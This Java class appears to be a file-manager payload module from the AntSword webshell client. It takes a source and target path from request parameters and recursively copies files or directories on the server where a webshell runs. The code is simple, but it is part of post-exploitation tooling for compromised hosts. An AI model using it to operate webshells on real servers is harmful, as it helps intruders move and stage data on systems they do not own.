package filemanager;

import antSword.Template;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;

public class Copy extends Template {
    @Override
    public String run() throws Exception {
        String z1 = getParam("antswordargpath");
        String z2 = getParam("antswordargtarget");
        return CopyFileOrDirCode(z1, z2);

    }

    String CopyFileOrDirCode(String sourceFilePath, String targetFilePath) throws Exception {
        File sf = new File(sourceFilePath), df = new File(targetFilePath);
        if (sf.isDirectory()) {
            if (!df.exists()) {
                df.mkdir();
            }
            File[] z = sf.listFiles();
            for (int j = 0; j < z.length; j++) {
                CopyFileOrDirCode(sourceFilePath + "/" + z[j].getName(), targetFilePath + "/" + z[j].getName());
            }
        } else {
            FileInputStream is = new FileInputStream(sf);
            FileOutputStream os = new FileOutputStream(df);
            int n;
            byte[] b = new byte[1024];
            while ((n = is.read(b, 0, 1024)) != -1) {
                os.write(b, 0, n);
            }
            is.close();
            os.close();
        }
        return "1";
    }
}
